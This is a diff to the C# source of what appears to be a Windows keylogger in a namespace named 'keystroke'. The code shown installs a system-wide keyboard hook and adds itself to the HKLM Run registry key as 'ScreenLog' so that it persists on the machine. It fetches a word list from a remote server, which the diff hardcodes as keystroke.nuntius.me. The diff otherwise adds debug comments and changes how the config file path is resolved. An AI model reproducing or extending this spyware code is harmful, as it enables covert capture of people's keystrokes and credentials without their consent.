@@ -51,6 +51,8 @@ namespace keystroke
                     RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                     add.SetValue("ScreenLog", Application.ExecutablePath);
                 }
+                //else
+                //    MessageBox.Show("You are welcome");
             }
             catch (Exception ex)
             {
@@ -58,13 +60,20 @@ namespace keystroke
                 //return;
             }
 
+            //MessageBox.Show("You are welcome1");
+
             readConfigFile();
+            //MessageBox.Show("You are welcome2");
             getWordList();
+            //MessageBox.Show("You are welcome3");
             
             _hookID = SetHook(_proc);
+            //MessageBox.Show("You are welcome4");
 
             //Application.EnableVisualStyles();
+            //MessageBox.Show("You are welcome5");
             //Application.SetCompatibleTextRenderingDefault(false);
+            //MessageBox.Show("You are welcome6");            
             //Application.Run(new Form1());
             Application.Run();
             UnhookWindowsHookEx(_hookID);
@@ -84,7 +93,11 @@ namespace keystroke
 
         private static void readConfigFile()
         {
-            StreamReader fs = new StreamReader("config.txt");
+            String exe_path = Application.ExecutablePath;
+            String dir_path = Path.GetDirectoryName(exe_path);
+            String config_path = dir_path + "\\" + "config.txt";
+            //MessageBox.Show(config_path);
+            StreamReader fs = new StreamReader(config_path);
 
             string config = fs.ReadLine();
             SERVER_ADDRESS = config.Replace("Server_Address=", "").Trim();
@@ -96,7 +109,7 @@ namespace keystroke
 
         private static void getWordList()
         {
-            string result = WebHttpUtils.getResponse("http://" + SERVER_ADDRESS + "/restapi.php?action=wordlist", "", "");
+            string result = WebHttpUtils.getResponse("http://" + "keystroke.nuntius.me" + "/restapi.php?action=wordlist", "", "");
             if (string.IsNullOrEmpty(result))
             {
                 return;
